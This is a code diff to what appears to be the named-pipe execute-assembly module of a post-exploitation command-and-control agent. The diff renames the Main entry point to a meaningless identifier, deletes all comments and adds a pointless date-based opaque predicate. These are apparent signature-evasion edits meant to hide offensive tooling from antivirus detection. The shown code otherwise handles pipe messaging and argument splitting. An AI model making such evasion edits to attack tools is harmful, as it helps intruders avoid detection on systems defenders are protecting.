@@ -45,9 +45,9 @@ namespace ExecuteAssembly
         private static Action<object>? _transmitAction;
         private static ST.Task? _clientConnectedTask;
 
-        public static void Main(string[] args)
+        public static void J3m4n5o6(string[] args)
         {
-            //_namedPipeName = "executetest";
+            
             if (args.Length != 1)
             {
                 throw new Exception("No named pipe name given.");
@@ -75,7 +75,7 @@ namespace ExecuteAssembly
                     pipe.BeginWrite(message, 0, message.Length, ProcessSentMessage, pipe);
                 }
 
-                // Wait for all messages to be read by Phantom
+                
                 pipe.WaitForPipeDrain();
                 pipe.Close();
             };
@@ -133,7 +133,7 @@ namespace ExecuteAssembly
 
             _cts.Cancel();
 
-            // Wait for the pipe client comms to finish
+            
             while (_clientConnectedTask is ST.Task task && !_clientConnectedTask.IsCompleted)
             {
                 task.Wait(1000);
@@ -148,26 +148,26 @@ namespace ExecuteAssembly
 
             ptrToSplitArgs = CommandLineToArgvW(cmdline, out numberOfArgs);
 
-            // CommandLineToArgvW returns NULL upon failure.
+            
             if (ptrToSplitArgs == IntPtr.Zero)
                 throw new ArgumentException("Unable to split argument.", new Win32Exception());
 
-            // Make sure the memory ptrToSplitArgs to is freed, even upon failure.
+            
             try
             {
                 splitArgs = new string[numberOfArgs];
 
-                // ptrToSplitArgs is an array of pointers to null terminated Unicode strings.
-                // Copy each of these strings into our split argument array.
+                
+                
                 for (int i = 0; i < numberOfArgs; i++)
                     splitArgs[i] = Marshal.PtrToStringUni(
                         Marshal.ReadIntPtr(ptrToSplitArgs, i * IntPtr.Size));
 
-                return splitArgs;
+                if(DateTime.Now.Year > 2020) { return splitArgs; } else { return null; }
             }
             finally
             {
-                // Free memory obtained by CommandLineToArgW.
+                
                 LocalFree(ptrToSplitArgs);
             }
         }
@@ -219,14 +219,14 @@ namespace ExecuteAssembly
             }
 
             ICommandMessage msg = _dataSerializer.DeserializeIPCMessage(data.ToArray(), mt);
-            //Console.WriteLine("We got a message: {0}", mt.ToString());
+            
             _recieverQueue.Enqueue(msg);
             _msgRecvEvent.Set();
         }
 
         public static void OnAsyncConnect(object sender, PipeMessageData args)
         {
-            // We only accept one connection at a time, sorry.
+            
             if (_clientConnectedTask != null)
             {
                 args.Pipe.Close();
